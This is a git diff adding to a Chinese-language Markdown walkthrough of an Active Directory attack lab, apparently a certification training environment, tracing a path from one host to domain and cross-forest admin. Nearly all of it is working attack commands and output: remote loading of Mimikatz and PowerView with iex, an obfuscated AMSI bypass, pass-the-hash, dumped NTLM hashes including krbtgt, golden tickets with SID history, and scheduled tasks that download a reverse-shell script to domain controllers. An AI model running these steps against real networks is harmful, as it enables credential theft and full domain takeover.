@@ -756,7 +756,479 @@ dcorp-ci
 
 bypass powershell和AMSI
 
-远程加载Invoke-Mimikatz，导出哈希
-ex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
+远程加载Mimikatz和powerview
+```
+iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
 
 iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)
+```
+
+先收集dcorp-ci的域用户NTML
+执行：Invoke-Mimikatz
+
+收集到的哈希信息：
+```
+ciadmin：e08253add90dccf1a208523d02998c3d
+DCORP-CI$：bc7c774ae1c2f9325adee16ff86681fc
+```
+
+打开一个ciadmin权限的shell
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:ciadmin /domain:dollarcorp.moneycorp.local /ntlm:e08253add90dccf1a208523d02998c3d /run:powershell.exe"'
+```
+
+
+查找可以横向的计算机
+```
+PS C:\ad> Find-LocalAdminAccess
+dcorp-mgmt.dollarcorp.moneycorp.local
+dcorp-ci.dollarcorp.moneycorp.local
+dcorp-std366.dollarcorp.moneycorp.local
+```
+
+可以横向到dcorp-mgmt，之前我们在dcorp\srvadmin下也可以横向到dcorp-mgmt
+
+现在去dcorp-mgmt下看看会收集到什么信息
+
+横向到dcorp-mgmt，bypass powershell policy和AMSI
+```
+PS C:\ad> Enter-PSSession dcorp-mgmt.dollarcorp.moneycorp.local
+[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Users\ciadmin\Documents> powershell -ep bypass
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\ciadmin\Documents>
+[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Users\ciadmin\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') +
+('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{
+6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )
+."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'
++'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+
+远程载入mimikatz，dump出所有哈希
+```
+[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Users\ciadmin\Documents> iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
+[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Users\ciadmin\Documents> Invoke-Mimikatz
+```
+dcorp-mgmt收集到的信息有：
+```
+DCORP-MGMT$:639c1adde3e0d1ba0d733c7d0d8f23ec
+mgmtadmin:95e2cd7ff77379e34c6e46265e75d754
+svcadmin:b38ff50264b74508085d82c69794a4d8
+```
+
+现在我们得到了svcadmin的NTML，svcadmin是DA组成员，我们已经成功提权到DA
+
+用svcadmin的权限开一个shell
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
+```
+
+查看svcadmin可以横向的计算机列表：
+```
+PS C:\ad> Find-LocalAdminAccess
+dcorp-sql1.dollarcorp.moneycorp.local
+dcorp-std370.dollarcorp.moneycorp.local
+dcorp-std367.dollarcorp.moneycorp.local
+dcorp-dc.dollarcorp.moneycorp.local
+dcorp-stdadm.dollarcorp.moneycorp.local
+dcorp-adminsrv.dollarcorp.moneycorp.local
+dcorp-appsrv.dollarcorp.moneycorp.local
+dcorp-std359.dollarcorp.moneycorp.local
+dcorp-std361.dollarcorp.moneycorp.local
+dcorp-std364.dollarcorp.moneycorp.local
+dcorp-std360.dollarcorp.moneycorp.local
+dcorp-std363.dollarcorp.moneycorp.local
+dcorp-std366.dollarcorp.moneycorp.local
+dcorp-mgmt.dollarcorp.moneycorp.local
+dcorp-mssql.dollarcorp.moneycorp.local
+dcorp-std368.dollarcorp.moneycorp.local
+dcorp-std369.dollarcorp.moneycorp.local
+dcorp-ci.dollarcorp.moneycorp.local
+```
+
+可以横向到DC服务器
+
+```
+Enter-PSSession dcorp-dc.dollarcorp.moneycorp.local
+```
+
+再次收集这台计算机上所有用户的NTML
+```
+[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents> iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1
+ -UseBasicParsing)
+[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\svcadmin\Documents>  Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+```
+
+收集到域用户信息有：
+```
+mimikatz(powershell) # lsadump::lsa /patch
+Domain : dcorp / S-1-5-21-1874506631-3219952063-538504511
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : af0686cc0ca8f04df42210c9ac980760
+
+RID  : 000001f5 (501)
+User : Guest
+LM   :
+NTLM :
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : ff46a9d8bd66c6efd77603da26796f35
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+LM   :
+NTLM :
+
+RID  : 00000455 (1109)
+User : ciadmin
+LM   :
+NTLM : e08253add90dccf1a208523d02998c3d
+
+RID  : 00000458 (1112)
+User : sqladmin
+LM   :
+NTLM : 07e8be316e3da9a042a9cb681df19bf5
+
+RID  : 00000459 (1113)
+User : websvc
+LM   :
+NTLM : cc098f204c5887eaa8253e7c2749156f
+
+RID  : 0000045b (1115)
+User : srvadmin
+LM   :
+NTLM : a98e18228819e8eec3dfa33cb68b0728
+
+RID  : 0000045d (1117)
+User : appadmin
+LM   :
+NTLM : d549831a955fee51a43c83efb3928fa7
+
+RID  : 00000461 (1121)
+User : mgmtadmin
+LM   :
+NTLM : 95e2cd7ff77379e34c6e46265e75d754
+
+RID  : 00000462 (1122)
+User : svcadmin
+LM   :
+NTLM : b38ff50264b74508085d82c69794a4d8
+
+RID  : 0000046b (1131)
+User : studentadmin
+LM   :
+NTLM : d1254f303421d3cdbdc4c73a5bce0201
+
+RID  : 00000470 (1136)
+User : sql1admin
+LM   :
+NTLM : e999ae4bd06932620a1e78d2112138c6
+
+RID  : 000004bb (1211)
+User : testda
+LM   :
+NTLM : a16452f790729fa34e8f3a08f234a82c
+<略>
+```
+
+这里会打印出域内所有用户和计算机的NTML信息，原则上我们现在可以访问到这个域里的所有计算机。
+
+
+## 证明
+
+打开一个域管理员Administrator的shell
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
+```
+
+查看允许横向的机器
+```
+PS C:\ad> . .\PowerView.ps1
+PS C:\ad> Find-LocalAdminAccess
+dcorp-std360.dollarcorp.moneycorp.local
+dcorp-mssql.dollarcorp.moneycorp.local
+dcorp-std368.dollarcorp.moneycorp.local
+dcorp-appsrv.dollarcorp.moneycorp.local
+dcorp-ci.dollarcorp.moneycorp.local
+dcorp-mgmt.dollarcorp.moneycorp.local
+dcorp-std361.dollarcorp.moneycorp.local
+dcorp-std369.dollarcorp.moneycorp.local
+dcorp-std366.dollarcorp.moneycorp.local
+dcorp-dc.dollarcorp.moneycorp.local
+dcorp-std363.dollarcorp.moneycorp.local
+dcorp-sql1.dollarcorp.moneycorp.local
+dcorp-std370.dollarcorp.moneycorp.local
+dcorp-std364.dollarcorp.moneycorp.local
+dcorp-std367.dollarcorp.moneycorp.local
+dcorp-std359.dollarcorp.moneycorp.local
+dcorp-stdadm.dollarcorp.moneycorp.local
+dcorp-adminsrv.dollarcorp.moneycorp.local
+```
+
+在对应的机器里执行命令
+```
+PS C:\ad> Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-stdadm
+dcorp\administrator
+dcorp-stdadm
+PS C:\ad> Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-adminsrv
+dcorp\administrator
+dcorp-adminsrv
+PS C:\ad> Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mssql
+dcorp\administrator
+dcorp-mssql
+```
+
+
+# 跨域攻击
+
+继续使用dcorp\administrator的shell，枚举所有域信任关系
+```
+PS C:\ad> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
+```
+
+返回了三个域信任信息
+
+与父域MONEYCORP.LOCAL的信任信息
+```
+Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
+    * 1/23/2022 11:37:21 PM - CLEAR   - 28 62 25 ae 13 68 18 ad e4 4f b2 7c 22 64 22 9d 8f f7 ac c3 0e 24 2b 09 00 50 4b 35
+        * aes256_hmac       ff3616ac06c24395fb76b08d7cc7f0038cd257869b43eb13ebaf9a3061929a1e
+        * aes128_hmac       a2ab6e6daf483e61ed6ffa50856ad277
+        * rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7
+```
+
+与子域的信任信息
+```
+Domain: US.DOLLARCORP.MONEYCORP.LOCAL (us / S-1-5-21-3146393536-1393405867-2905981701)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
+    * 3/16/2021 7:44:52 AM - CLEAR   - 40 84 47 82 3b 03 64 82 0f 8e bf d3 78 18 df db d4 5f 13 bc 4d 7c df b5 8e f8 e3 29 ae e1 01 ce 20 c4 03 48 8f 4f 4e 77 eb a0 3b 1d 55 84 ba b0 72 62 4d df 34 df 2d 67 e7 78 8a 6a 18 99 87 11 f2 56 d7 34 e5 9b 88 b1 9d 91 b3 4e 11 2f 76 89 c2 45 7d c6 20 9a 83 97 ca 50 0e 33 d2 04 4f 82 83 69 46 d6 13 cf 8f db cd fe 3d 87 66 c9 ca 7f 24 38 ff c0 1b 5a 5f bf 58 b3 c7 83 06 2c f0 da fd f4 1b 46 de ca 61 e6 8e 8f ec d5 a8 6e 57 84 6f 42 cb 8c b3 ff 3f 14 8a c4 7c a7 c0 17 60 31 a0 2c 4b 0c 44 80 9e 37 77 37 df ea 32 96 16 ab e5 a3 f5 0b 8c 46 d9 7f 26 f3 05 7c 7f bb ac 16 be 5c ea a3 50 ee f0 ef 9a 4e fe a3 0a 6d f6 f2 5f c9 54 ee 47 20 02 ae 07 96 c4 c8 08 64 70 56 59 28 22 00 53 74 be 67 45 03 d9 e6 86 e5 36 42
+        * aes256_hmac       f13e09bb5b6f02a995d99a4c95982c1e6411b1b252d1aa268c25b9adcd22953f
+        * aes128_hmac       20e6b9441a57a19d14c62bb87a055264
+        * rc4_hmac_nt       3c26a18320e50801d1c3843a129617f8
+```
+
+与另外一个森林里的eurocorp.local的信任关系
+```
+Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
+    * 1/29/2022 1:20:05 AM - CLEAR   - 1f 6f c4 25 57 c2 50 6e e2 8c b8 94 07 da 97 13 cc 89 5d 6d 0e 47 05 91 74 7c 3a c1
+        * aes256_hmac       91df6bcc4a71d585b710532ff73b662d43e4d83a00821f7d509319e4ce1897c5
+        * aes128_hmac       47f41fc169b79c34d8af08afa3cfdde9
+        * rc4_hmac_nt       cccb3ce736c4d39039b48c79f075a430
+```
+
+用powerview可以更加清晰的看到这些关系
+```
+PS C:\ad> Get-NetDomainTrust -Domain dollarcorp.moneycorp.local
+
+SourceName                 TargetName                      TrustType TrustDirection
+----------                 ----------                      --------- --------------
+dollarcorp.moneycorp.local moneycorp.local               ParentChild  Bidirectional
+dollarcorp.moneycorp.local us.dollarcorp.moneycorp.local ParentChild  Bidirectional
+dollarcorp.moneycorp.local eurocorp.local                   External  Bidirectional
+```
+
+## 子域到父域（CIFS，访问文件系统）
+
+获取父域的计算机列表
+```
+PS C:\ad\kekeo_old> Get-NetComputer -Domain moneycorp.local
+mcorp-dc.moneycorp.local
+dcorp-stdadmin.moneycorp.local
+```
+
+很明显，mcorp-dc就是父域里的DC服务器
+
+伪造一条到父域```moneycorp.local```的TGT
+
+从上面信息我们得知，父域的SID是：```S-1-5-21-280534878-1496970234-700767426```
+
+这里需要注意下面命令参数里的rc4，必须是上面枚举出来的
+```* rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7```这个值
+
+不能使用Administrator的用户NTML
+
+伪造TGT
+```
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:13d28ca9e5863231c89eda2b2b1756d7 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\kekeo_old\child2parent_trust_tkt.kirbi"'
+```
+
+在```C:\AD\kekeo_old```下现在应该可以看到一个child2parent_trust_tkt.kirbi文件
+
+### 方法一 （kekeo）
+
+制作一张可以访问父域moneycorp.local的TGS
+
+```
+PS C:\ad\kekeo_old> .\asktgs.exe C:\AD\kekeo_old\child2parent_trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
+
+  .#####.   AskTGS Kerberos client 1.0 (x86) built on Dec  8 2016 00:31:13
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
+  '#####'                                                     * * */
+
+Ticket    : C:\AD\kekeo_old\child2parent_trust_tkt.kirbi
+Service   : krbtgt / moneycorp.local @ dollarcorp.moneycorp.local
+Principal : Administrator @ dollarcorp.moneycorp.local
+
+> CIFS/mcorp-dc.moneycorp.local
+  * Ticket in file 'CIFS.mcorp-dc.moneycorp.local.kirbi'
+```
+
+此时在```C:\AD\kekeo_old```下已经生成一个CIFS.mcorp-dc.moneycorp.local.kirbi的TGS文件
+
+
+将 TGS 呈现给目标服务
+```
+PS C:\ad\kekeo_old>  .\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
+
+  .#####.   KiRBikator 1.1 (x86) built on Dec  8 2016 00:31:14
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
+  '#####'                                                     * * */
+
+Destination : Microsoft LSA API (multiple)
+ < .\CIFS.mcorp-dc.moneycorp.local.kirbi (RFC KRB-CRED (#22))
+ > Ticket Administrator@dollarcorp.moneycorp.local-CIFS~mcorp-dc.moneycorp.local@MONEYCORP.LOCAL : injected
+```
+
+现在可以访问到父域DC
+```
+PS C:\ad\kekeo_old> ls //mcorp-dc.moneycorp.local/c$
+
+
+    Directory: \\mcorp-dc.moneycorp.local\c$
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       11/29/2019   4:33 AM                PerfLogs
+d-r---        2/16/2019   9:14 PM                Program Files
+d-----        7/16/2016   6:23 AM                Program Files (x86)
+d-r---        2/16/2019   9:14 PM                Users
+d-----        8/20/2020   2:57 AM                Windows
+```
+
+
+## 子域到父域（以用户身份访问，可以执行shell）
+
+krbtgt的NTML信息
+```
+krbtgt:ff46a9d8bd66c6efd77603da26796f35
+```
+
+生成一个用户访问TGT
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi"'
+```
+
+下面命令把TGT注入到mimikatz中
+```
+Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\krbtgt_tkt.kirbi"'
+```
+
+使用下面两个命令之一验证上面操作是否成功
+```
+gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
+```
+或者
+```
+ls \\mcorp-dc.moneycorp.local\c$
+```
+
+利用上面已经取得的权限，为mcorp-dc添加一个定时任务
+```
+schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
+```
+
+触发定时任务
+```
+schtasks /Run /S mcorp-dc.moneycorp.local /TN "User366"
+```
+
+收到反弹shell
+```
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>PS C:\Windows\system32> whoami
+nt authority\system
+PS C:\Windows\system32> hostname
+mcorp-dc
+PS C:\Windows\system32>
+```
+
+
+# 跨林访问
+
+开启一个DA的shell
+
+伪造一条到EUROCORP.LOCAL的TGT
+```
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:cccb3ce736c4d39039b48c79f075a430 /service:krbtgt /target:EUROCORP.LOCAL /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi"'
+```
+
+
+制作一张可以访问EUROCORP.LOCAL的TGS
+
+```
+.\asktgs.exe C:\AD\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
+```
+
+将 TGS 呈现给目标服务
+```
+.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi
+```
+
+查看目标计算机里的SharedwithDCorp文件夹
+```
+ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
+```
+
+## 方法二（rebuse.exe）
+
+
+同样的，也可以使用Rubeus.exe，复用上面已经生成的TGT，生成TGS
+```
+.\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
+```
+
+访问对方林中的计算机
+```
+ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
+```
+
+
+
+
+生成一个用户访问TGT
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-1652071801-1423090587-98612180-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_forest_tkt.kirbi"'
+```
+
+ C:\AD\krbtgt_forest_tkt.kirbi
+
+
+ Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\krbtgt_forest_tkt.kirbi"'
+
+
+
+利用上面已经取得的权限，为mcorp-dc添加一个定时任务
+```
+schtasks /create /S eurocorp-dc.eurocorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
+```
+
+触发定时任务
+```
+schtasks /Run /S eurocorp-dc.eurocorp.local /TN "User366"
+```
